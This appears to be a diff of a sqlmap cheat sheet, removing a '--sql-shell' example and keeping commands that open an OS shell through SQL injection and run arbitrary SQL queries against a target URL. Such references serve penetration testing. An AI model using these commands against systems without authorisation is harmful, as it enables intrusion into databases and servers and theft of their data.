@@ -27,9 +27,6 @@ sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --d
 # Get OS shell
 sqlmap --dbms=mysql -u "$URL" --os-shell
 
-# Get SQL shell
-sqlmap --dbms=mysql -u "$URL" --sql-shell
-
 # SQL query
 sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
 
